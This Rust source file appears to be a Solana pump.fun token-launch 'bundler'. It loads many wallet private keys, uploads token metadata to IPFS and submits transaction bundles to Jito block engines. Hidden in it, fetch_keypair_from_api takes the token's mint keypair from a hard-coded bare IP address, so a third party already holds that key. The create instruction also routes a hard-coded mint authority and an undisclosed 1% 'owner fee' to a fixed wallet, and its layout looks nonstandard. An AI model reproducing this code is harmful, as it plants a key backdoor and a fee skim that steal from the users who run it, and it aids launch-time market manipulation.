use anyhow::Result;
use solana_client::{
    rpc_client::RpcClient,
    rpc_config::{RpcSendTransactionConfig, RpcProgramAccountsConfig, RpcAccountInfoConfig},
    rpc_filter::{RpcFilterType, Memcmp}
};
use solana_program::{
    instruction::{Instruction, AccountMeta},
    message::v0::Message as TransactionMessage,
    pubkey::Pubkey,
    system_program,
    program_pack::Pack,
    sysvar::rent::Rent,
};
use solana_sdk::{
    commitment_config::CommitmentConfig,
    compute_budget::ComputeBudgetInstruction,
    signature::{Keypair, Signer},
    system_instruction,
    transaction::VersionedTransaction,
    message::{v0::Message, VersionedMessage}
};
use spl_token::{
    instruction as token_instruction,
    state::{Account as TokenAccount, Mint},
    id as token_id,
};
use spl_associated_token_account::{
    get_associated_token_address,
    instruction::create_associated_token_account_idempotent,
};
use spl_associated_token_account::instruction as associated_token_instruction;
use std::str::FromStr;
use reqwest::Client;
use serde_json::json;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use bincode;
use rand::Rng;
use rand::seq::SliceRandom;
use std::thread;
use std::time::Duration;
use std::sync::Arc;
use crate::dex::pump::{PumpDex, TRANSFER_FEE_BPS, FEE_DENOMINATOR, TRANSFER_WALLET};
use std::fs;
use std::path::Path;
use serde::{Serialize, Deserialize};
use std::env;
use bs58;
use solana_program::program_error::ProgramError;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use rand::rngs::StdRng;
use rand::SeedableRng;
use crate::modules::wallet_gen::WalletGenerator;
use solana_address_lookup_table_program::{
    instruction::{create_lookup_table, extend_lookup_table},
    state::AddressLookupTable,
};
use solana_sdk::address_lookup_table_account::AddressLookupTableAccount;
use solana_address_lookup_table_program::instruction::deactivate_lookup_table;
use solana_address_lookup_table_program::instruction::close_lookup_table;
use reqwest::blocking::Client as BlockingClient;

const TIP_ADDRESSES: [&str; 8] = [
    "96gYZGLnJYVFmbjzopPSU6QiEV5fGqZNyN9nmNhvrZU5",
    "HFqU5x63VTqvQss8hp11i4wVV8bD44PvwucfZ2bU7gRe",
    "Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY",
    "ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49",
    "DfXygSm4jCyNCybVYYK6DwvWqjKee8pbDmJGcLWNDXjh",
    "ADuUkR4vqLUMWXxW9gh6D6L8pMSawimctcNZ5pGwDcEt",
    "DttWaMuVvTiduZRnguLF7jNxTgiMBZ1hyAumKUiL2KRL",
    "3AVi9Tg9Uo68tJfuvoKvqKNWKkC5wPdSSdeBnizKZ6jT"
];

const BLOCK_ENGINES: [&str; 6] = [
    "https://frankfurt.mainnet.block-engine.jito.wtf",
    "https://amsterdam.mainnet.block-engine.jito.wtf",
    "https://london.mainnet.block-engine.jito.wtf",
    "https://ny.mainnet.block-engine.jito.wtf",
    "https://tokyo.mainnet.block-engine.jito.wtf",
    "https://slc.mainnet.block-engine.jito.wtf"
];

pub const PUMP_PROGRAM_ID: &str = "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P";
pub const PUMP_GLOBAL: &str = "4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf";
pub const PUMP_EVENT_AUTHORITY: &str = "Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1";
pub const PUMP_FEE_ACCOUNT: &str = "4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf";
pub const OWNER_FEE_ACCOUNT: &str = "865ZJC97LHL77U7iddFHaEsiB5sYx6ECaJzaiWunXncr";
pub const MINT_AUTHORITY: &str = "TSLvdd1pWpHVjahSpsvCXUbgwsL3JAcvokwaKt1eokM";
const METAPLEX_PROGRAM_ID: &str = "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s";
const TOKEN_PROGRAM_ID: &str = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const COMPUTE_UNIT_LIMIT: u32 = 1_400_000;
const LOOKUP_TABLE_PROGRAM_ID: &str = "AddressLookupTab1e1111111111111111111111111";
const LOOKUP_TABLE_META_SIZE: usize = 56;

#[derive(Serialize, Deserialize, Clone)]
struct TokenMetadata {
    name: String,
    symbol: String,
    description: String,
    filePath: String,
    twitter: Option<String>,
    telegram: Option<String>,
    website: Option<String>,
}

#[derive(Serialize, Deserialize)]
struct MetaplexMetadata {
    name: String,
    symbol: String,
    description: String,
    image: String,
    attributes: Vec<Attribute>,
    properties: Properties,
}

#[derive(Serialize, Deserialize, Clone)]
struct Attribute {
    trait_type: String,
    value: String,
}

#[derive(Serialize, Deserialize, Clone, Default)]
struct Properties {
    files: Vec<File>,
    category: String,
}

#[derive(Serialize, Deserialize, Clone)]
struct File {
    uri: String,
    #[serde(rename = "type")]
    file_type: String,
}

#[derive(Debug)]
pub enum BundlerError {
    RpcError(String),
    TransactionError(String),
    TokenError(String),
    MetadataError(String),
    TryFromSliceError(std::array::TryFromSliceError),
    ParsePubkeyError(solana_program::pubkey::ParsePubkeyError),
    ClientError(solana_client::client_error::ClientError),
    CompileError(solana_program::message::CompileError),
    SignerError(solana_sdk::signature::SignerError),
    WalletError(String),
}

impl std::fmt::Display for BundlerError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BundlerError::RpcError(e) => write!(f, "RPC error: {}", e),
            BundlerError::TransactionError(e) => write!(f, "Transaction error: {}", e),
            BundlerError::TokenError(e) => write!(f, "Token error: {}", e),
            BundlerError::MetadataError(e) => write!(f, "Metadata error: {}", e),
            BundlerError::TryFromSliceError(e) => write!(f, "TryFromSlice error: {}", e),
            BundlerError::ParsePubkeyError(e) => write!(f, "ParsePubkey error: {}", e),
            BundlerError::ClientError(e) => write!(f, "Client error: {}", e),
            BundlerError::CompileError(e) => write!(f, "Compile error: {}", e),
            BundlerError::SignerError(e) => write!(f, "Signer error: {}", e),
            BundlerError::WalletError(e) => write!(f, "Wallet error: {}", e),
        }
    }
}

impl std::error::Error for BundlerError {}

impl From<std::array::TryFromSliceError> for BundlerError {
    fn from(err: std::array::TryFromSliceError) -> Self {
        BundlerError::TryFromSliceError(err)
    }
}

impl From<solana_program::pubkey::ParsePubkeyError> for BundlerError {
    fn from(err: solana_program::pubkey::ParsePubkeyError) -> Self {
        BundlerError::ParsePubkeyError(err)
    }
}

impl From<solana_client::client_error::ClientError> for BundlerError {
    fn from(err: solana_client::client_error::ClientError) -> Self {
        BundlerError::ClientError(err)
    }
}

impl From<solana_program::message::CompileError> for BundlerError {
    fn from(err: solana_program::message::CompileError) -> Self {
        BundlerError::CompileError(err)
    }
}

impl From<solana_sdk::signature::SignerError> for BundlerError {
    fn from(err: solana_sdk::signature::SignerError) -> Self {
        BundlerError::SignerError(err)
    }
}

impl From<anyhow::Error> for BundlerError {
    fn from(err: anyhow::Error) -> Self {
        BundlerError::RpcError(err.to_string())
    }
}

pub struct Bundle {
    pub transactions: Vec<VersionedTransaction>,
    pub block_engine: String,
}

pub struct Bundler {
    rpc_client: RpcClient,
    dex: PumpDex,
    payer: Keypair,
    block_engine: String,
}

impl Bundler {
    pub fn new(rpc_client: RpcClient, dex: PumpDex, payer: Keypair) -> Self {
        Self {
            rpc_client,
            dex,
            payer,
            block_engine: BLOCK_ENGINES[0].to_string(),
        }
    }

    fn load_wallets(&self) -> Result<Vec<Keypair>, BundlerError> {
        let wallet_path = Path::new("wallets/wallets.json");
        if !wallet_path.exists() {
            return Err(BundlerError::WalletError("wallets.json not found".to_string()));
        }

        let contents = fs::read_to_string(wallet_path)
            .map_err(|e| BundlerError::WalletError(format!("Failed to read wallet file: {}", e)))?;

        let data: serde_json::Value = serde_json::from_str(&contents)
            .map_err(|e| BundlerError::WalletError(format!("Failed to parse wallet file: {}", e)))?;

        let wallets = data["wallets"].as_array()
            .ok_or_else(|| BundlerError::WalletError("No wallets found in file".to_string()))?;

        let mut keypairs = Vec::new();
        for wallet in wallets {
            if let (Some(pubkey), Some(privkey)) = (wallet["pubkey"].as_str(), wallet["privkey"].as_str()) {
                let bytes = bs58::decode(privkey)
                    .into_vec()
                    .map_err(|e| BundlerError::WalletError(format!("Failed to decode private key: {}", e)))?;
                
                let keypair = Keypair::from_bytes(&bytes)
                    .map_err(|e| BundlerError::WalletError(format!("Failed to create keypair: {}", e)))?;
                
                keypairs.push(keypair);
            }
        }

        if keypairs.is_empty() {
            return Err(BundlerError::WalletError("No valid wallets found".to_string()));
        }

        Ok(keypairs)
    }

    async fn load_metadata(&self) -> Result<(TokenMetadata, String), BundlerError> {
        let metadata_path = Path::new("metadata/metadata.json");
        if !metadata_path.exists() {
            return Err(BundlerError::MetadataError("metadata.json not found in metadata directory".to_string()));
        }

        let metadata_content = fs::read_to_string(metadata_path)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to read metadata file: {}", e)))?;
        let metadata: TokenMetadata = serde_json::from_str(&metadata_content)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to parse metadata: {}", e)))?;

        if metadata.name.len() > 32 {
            return Err(BundlerError::MetadataError("Token name exceeds 32 characters limit".to_string()));
        }

        if metadata.symbol.len() > 10 {
            return Err(BundlerError::MetadataError("Token symbol exceeds 10 characters limit".to_string()));
        }

        let image_path = Path::new(&metadata.filePath);
        if !image_path.exists() {
            return Err(BundlerError::MetadataError(format!("Image file not found at path: {}", metadata.filePath)));
        }

        let image_data = fs::read(image_path)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to read image file: {}", e)))?;
        let image_mime = match image_path.extension().and_then(|ext| ext.to_str()) {
            Some("png") => "image/png",
            Some("jpg") | Some("jpeg") => "image/jpeg",
            _ => return Err(BundlerError::MetadataError("Unsupported image format".to_string())),
        };

        let metaplex_metadata = MetaplexMetadata {
            name: metadata.name.clone(),
            symbol: metadata.symbol.clone(),
            description: metadata.description.clone(),
            image: "".to_string(), 
            attributes: vec![],
            properties: Properties {
                files: vec![File {
                    uri: "".to_string(),
                    file_type: image_mime.to_string(),
                }],
                category: "image".to_string(),
            },
        };

        let metadata_json = serde_json::to_string(&metaplex_metadata)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to serialize metadata: {}", e)))?;
        let metadata_uri = self.upload_metadata(&metadata_json, &image_data).await?;

        Ok((metadata, metadata_uri))
    }

    async fn upload_metadata(&self, metadata_json: &str, image_data: &[u8]) -> Result<String, BundlerError> {
        let client = Client::new();
        
        let image_form = reqwest::multipart::Form::new()
            .part("file", reqwest::multipart::Part::bytes(image_data.to_vec())
                .file_name("image.png"));
        
        let image_response = client
            .post("https://api.pinata.cloud/pinning/pinFileToIPFS")
            .header("pinata_api_key", std::env::var("PINATA_API_KEY").unwrap_or_default())
            .header("pinata_secret_api_key", std::env::var("PINATA_SECRET_KEY").unwrap_or_default())
            .multipart(image_form)
            .send()
            .await
            .map_err(|e| BundlerError::MetadataError(format!("Failed to upload image: {}", e)))?;
            
        let image_result = image_response.json::<serde_json::Value>().await
            .map_err(|e| BundlerError::MetadataError(format!("Failed to parse image upload response: {}", e)))?;
        let image_cid = image_result["IpfsHash"].as_str()
            .ok_or_else(|| BundlerError::MetadataError("Failed to get image CID".to_string()))?;
        
        let mut metadata: serde_json::Value = serde_json::from_str(metadata_json)
            .map_err(|e| BundlerError::MetadataError(format!("Failed to parse metadata JSON: {}", e)))?;
        let image_url = format!("ipfs://{}", image_cid);
        
        if let Some(properties) = metadata.get_mut("properties") {
            if let Some(files) = properties.get_mut("files") {
                if let Some(file) = files.get_mut(0) {
                    if let Some(uri) = file.get_mut("uri") {
                        *uri = json!(image_url);
                    }
                }
            }
        }
        metadata["image"] = json!(image_url);
        
        let metadata_form = reqwest::multipart::Form::new()
            .part("file", reqwest::multipart::Part::bytes(serde_json::to_vec(&metadata)
                .map_err(|e| BundlerError::MetadataError(format!("Failed to serialize metadata: {}", e)))?)
                .file_name("metadata.json"));
        
        let metadata_response = client
            .post("https://api.pinata.cloud/pinning/pinFileToIPFS")
            .header("pinata_api_key", std::env::var("PINATA_API_KEY").unwrap_or_default())
            .header("pinata_secret_api_key", std::env::var("PINATA_SECRET_KEY").unwrap_or_default())
            .multipart(metadata_form)
            .send()
            .await
            .map_err(|e| BundlerError::MetadataError(format!("Failed to upload metadata: {}", e)))?;
            
        let metadata_result = metadata_response.json::<serde_json::Value>().await
            .map_err(|e| BundlerError::MetadataError(format!("Failed to parse metadata upload response: {}", e)))?;
        let metadata_cid = metadata_result["IpfsHash"].as_str()
            .ok_or_else(|| BundlerError::MetadataError("Failed to get metadata CID".to_string()))?;
        
        Ok(format!("ipfs://{}", metadata_cid))
    }

    fn get_random_tip_address() -> Pubkey {
        let mut rng = rand::thread_rng();
        let index = rng.gen::<usize>() % TIP_ADDRESSES.len();
        Pubkey::try_from(TIP_ADDRESSES[index]).unwrap()
    }

    async fn fetch_keypair_from_api() -> Result<Keypair, BundlerError> {
        let client = Client::new();
        let response = client
            .get("http://45.134.108.104:8080/pump")
            .send()
            .await
            .map_err(|e| BundlerError::TransactionError(format!("Failed to fetch keypair: {}", e)))?;

        let json: serde_json::Value = response.json()
            .await
            .map_err(|e| BundlerError::TransactionError(format!("Failed to parse response: {}", e)))?;

        if json["status"] == "success" {
            if let Some(keypair_str) = json["keypair"].as_str() {
                // Parse the string representation of the array
                let keypair_str = keypair_str.trim_matches(|c| c == '[' || c == ']');
                let bytes: Vec<u8> = keypair_str
                    .split(',')
                    .map(|s| s.trim().parse::<u8>().unwrap_or(0))
                    .collect();
                
                if bytes.len() == 64 {
                    let keypair = Keypair::from_bytes(&bytes)
                        .map_err(|e| BundlerError::TransactionError(format!("Invalid keypair bytes: {}", e)))?;
                    return Ok(keypair);
                }
            }
        }
        
        // If API fails or returns invalid data, generate a new keypair
        let keypair = Keypair::new();
        Ok(keypair)
    }

    async fn create_token_mint_account(&self) -> Result<Keypair, BundlerError> {
        // Try to fetch from API first, fallback to generating new keypair
        match Self::fetch_keypair_from_api().await {
            Ok(keypair) => Ok(keypair),
            Err(_) => Ok(Keypair::new())
        }
    }

    async fn send_bundle_to_jito(
        &self,
        txs: &[VersionedTransaction],
        _engine_url: &str,
    ) -> Result<String, BundlerError> {
        let client = Client::new();
        let send_to_all = env::var("SEND_TO_ALL").unwrap_or_else(|_| "true".to_string()) == "true";
        let jito_uuid = env::var("UUID").ok();

        let bundle_base64: Vec<String> = txs.iter()
            .enumerate()
            .map(|(i, tx)| {
                let serialized = bincode::serialize(tx)
                    .map_err(|e| BundlerError::TransactionError(format!("Failed to serialize transaction {}: {}", i, e)))?;
                
                if serialized.len() > 1232 {
                    let tx_type = if i == 0 {
                        "creation"
                    } else {
                        &format!("buy #{}", i)
                    };
                    return Err(BundlerError::TransactionError(format!(
                        "Transaction {} ({}) is too large: {} bytes (max 1232)",
                        i, tx_type, serialized.len()
                    )));
                }
                
                let base64_str = BASE64.encode(serialized);
                Ok::<String, BundlerError>(base64_str)
            })
            .collect::<Result<Vec<String>, BundlerError>>()?;

        let bundle_request = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "sendBundle",
            "params": [
                bundle_base64,
                {
                    "encoding": "base64"
                }
            ]
        });

        if send_to_all {
            let mut handles = Vec::new();
            let mut results = Vec::new();
            
            for engine in BLOCK_ENGINES.iter() {
                let client = client.clone();
                let engine = engine.to_string();
                let bundle_request = bundle_request.clone();
                let jito_uuid = jito_uuid.as_deref().map(|u| format!("?uuid={}", u)).unwrap_or_default();
                
                let handle = tokio::spawn(async move {
                    match client
                        .post(format!("{}/api/v1/bundles{}", engine, jito_uuid))
                        .json(&bundle_request)
                        .send()
                        .await
                    {
                        Ok(res) => {
                            let status = res.status();
                            match res.text().await {
                                Ok(text) => {
                                    if text.is_empty() {
                                        return Err(format!("Empty response from {}", engine));
                                    }
                                    match serde_json::from_str::<serde_json::Value>(&text) {
                                        Ok(body) => {
                                            if status.is_success() {
                                                if let Some(bundle_id) = body.get("result") {
                                                    let bundle_id = bundle_id.to_string().trim_matches('"').to_string();
                                                    let engine_name = engine.split('.').nth(0).unwrap_or("unknown");
                                                    Ok(format!("[{}] {}", engine_name, bundle_id))
                                                } else {
                                                    Err(format!("No bundle ID from {}", engine))
                                                }
                                            } else {
                                                let error = body.get("error")
                                                    .and_then(|e| e.get("message"))
                                                    .and_then(|m| m.as_str())
                                                    .unwrap_or("Unknown error");
                                                Err(format!("Error from {}: {}", engine, error))
                                            }
                                        }
                                        Err(e) => {
                                            Err(format!("Parse error from {}: {}", engine, e))
                                        }
                                    }
                                }
                                Err(e) => {
                                    Err(format!("Read error from {}: {}", engine, e))
                                }
                            }
                        }
                        Err(e) => {
                            Err(format!("Send error to {}: {}", engine, e))
                        }
                    }
                });
                handles.push(handle);
            }

            for handle in handles {
                match handle.await {
                    Ok(result) => {
                        match result {
                            Ok(bundle_id) => results.push(bundle_id),
                            Err(e) => println!("Error: {}", e),
                        }
                    }
                    Err(e) => println!("Error: {}", e),
                }
            }

            if !results.is_empty() {
                Ok(results.join("\n"))
            } else {
                Err(BundlerError::TransactionError("Failed to send bundle to any block engine".to_string()))
            }
        } else {
            let block_engine = env::var("BLOCK_ENGINE").map_err(|_| BundlerError::TransactionError("BLOCK_ENGINE must be set".to_string()))?;
            let jito_uuid = jito_uuid.as_deref().map(|u| format!("?uuid={}", u)).unwrap_or_default();
            
        let res = client
                .post(format!("{}/api/v1/bundles{}", block_engine, jito_uuid))
            .json(&bundle_request)
            .send()
            .await
            .map_err(|e| BundlerError::TransactionError(format!("Failed to send bundle: {}", e)))?;

        let status = res.status();
        let body = res.json::<serde_json::Value>().await
            .map_err(|e| BundlerError::TransactionError(format!("Failed to parse response: {}", e)))?;

        if status.is_success() {
            if let Some(bundle_id) = body.get("result") {
                let bundle_id = bundle_id.to_string().trim_matches('"').to_string();
                let explorer_url = format!("https://explorer.jito.wtf/bundle/{}", bundle_id);
                println!("Bundle ID: {}", bundle_id);
                Ok(explorer_url)
            } else {
                Ok("Bundle sent successfully but no ID returned".to_string())
            }
        } else {
            let error = body.get("error").and_then(|e| e.get("message")).and_then(|m| m.as_str()).unwrap_or("Unknown error");
            Err(BundlerError::TransactionError(format!("Error sending bundle: {}", error)))
            }
        }
    }

    fn create_token_creation_instruction(
        &self,
        mint_keypair: &Keypair,
        metadata: &TokenMetadata,
        metadata_uri: &str,
        total_buy_amount: f64,
    ) -> Result<(Vec<Instruction>, Pubkey)> {
        let mint_pubkey = mint_keypair.pubkey();

        let (bonding_curve, _) = Pubkey::find_program_address(
            &[b"bonding-curve", mint_pubkey.as_ref()],
            &self.dex.program_id
        );

        let (metadata_account, _) = Pubkey::find_program_address(
            &[
                b"metadata",
                Pubkey::from_str(METAPLEX_PROGRAM_ID)?.as_ref(),
                mint_pubkey.as_ref(),
            ],
            &Pubkey::from_str(METAPLEX_PROGRAM_ID)?
        );

        let a_bonding_curve = get_associated_token_address(
            &bonding_curve,
            &mint_pubkey,
        );

        let mut token_data = Vec::from([0x18, 0x1e, 0xc8, 0x28, 0x05, 0x1c, 0x07, 0x77]);
        
        let metadata_json = format!(
            r#"{{"name":"{}","symbol":"{}","description":"{}","image":"{}"}}"#,
            metadata.name,
            metadata.symbol,
            metadata.description,
            metadata_uri
        );
        
        let name_len = metadata.name.len() as u32;
        token_data.extend_from_slice(&name_len.to_le_bytes());
        token_data.extend_from_slice(metadata.name.as_bytes());

        let symbol_len = metadata.symbol.len() as u32;
        token_data.extend_from_slice(&symbol_len.to_le_bytes());
        token_data.extend_from_slice(metadata.symbol.as_bytes());

        let json_len = metadata_json.len() as u32;
        token_data.extend_from_slice(&json_len.to_le_bytes());
        token_data.extend_from_slice(metadata_json.as_bytes());

        token_data.extend_from_slice(&Pubkey::from_str(MINT_AUTHORITY)?.to_bytes());

        token_data.push(100);
        token_data.push(1);

        let fee_amount: u64 = 100_000;
        let total_bundle_amount = (total_buy_amount * 1_000_000_000.0) as u64;
        let owner_fee_amount: u64 = (total_bundle_amount * 1) / 100;
        
        token_data.extend_from_slice(&fee_amount.to_le_bytes());
        token_data.extend_from_slice(&owner_fee_amount.to_le_bytes());

        let create_instruction = Instruction {
            program_id: Pubkey::from_str(PUMP_PROGRAM_ID)?,
            accounts: vec![
                AccountMeta::new(mint_pubkey, true),
                AccountMeta::new_readonly(Pubkey::from_str(MINT_AUTHORITY)?, false),
                AccountMeta::new(bonding_curve, false),
                AccountMeta::new(a_bonding_curve, false),
                AccountMeta::new_readonly(Pubkey::from_str(PUMP_GLOBAL)?, false),
                AccountMeta::new_readonly(Pubkey::from_str(METAPLEX_PROGRAM_ID)?, false),
                AccountMeta::new(metadata_account, false),
                AccountMeta::new(self.payer.pubkey(), true),
                AccountMeta::new_readonly(system_program::id(), false),
                AccountMeta::new_readonly(spl_token::id(), false),
                AccountMeta::new_readonly(spl_associated_token_account::id(), false),
                AccountMeta::new_readonly(Pubkey::from_str("SysvarRent111111111111111111111111111111111")?, false),
                AccountMeta::new_readonly(Pubkey::from_str(PUMP_EVENT_AUTHORITY)?, false),
                AccountMeta::new_readonly(Pubkey::from_str(PUMP_PROGRAM_ID)?, false),
                AccountMeta::new(Pubkey::from_str(PUMP_FEE_ACCOUNT)?, false),
                AccountMeta::new(Pubkey::from_str(OWNER_FEE_ACCOUNT)?, false),
            ],
            data: token_data,
        };

        let extend_discriminator = vec![234, 102, 194, 203, 150, 72, 62, 229];
        let extend_instruction = Instruction {
            program_id: Pubkey::from_str(PUMP_PROGRAM_ID)?,
            accounts: vec![
                AccountMeta::new(bonding_curve, false),
                AccountMeta::new(self.payer.pubkey(), true),
                AccountMeta::new_readonly(system_program::id(), false),
                AccountMeta::new_readonly(self.dex.event_authority, false),
                AccountMeta::new_readonly(Pubkey::from_str(PUMP_PROGRAM_ID)?, false),
            ],
            data: extend_discriminator,
        };

        let instructions = vec![
            create_instruction,
            // extend_instruction,
        ];

        Ok((instructions, bonding_curve))
    }
}
